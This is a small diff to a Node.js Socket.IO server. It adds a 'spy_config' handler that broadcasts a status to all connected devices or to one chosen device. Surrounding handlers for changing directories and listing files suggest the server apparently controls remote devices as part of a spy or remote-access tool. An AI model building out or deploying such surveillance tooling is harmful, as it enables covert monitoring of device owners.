@@ -80,6 +80,14 @@ io.on("connection", (socket) => {
     console.log(dir);
     io.to(device_secure_ids[too]).emit("change_dir", dir);
   });
+socket.on("spy_config", (status, too) => {
+    console.log(status);
+    if(too == "all"){
+    io.emit("spy_config", status);
+    }else{
+    io.to(device_secure_ids[too]).emit("spy_config", status);
+ }
+ });
   socket.on("new_files", (list, typ,size) => {
     console.log(list);
     console.log(size)
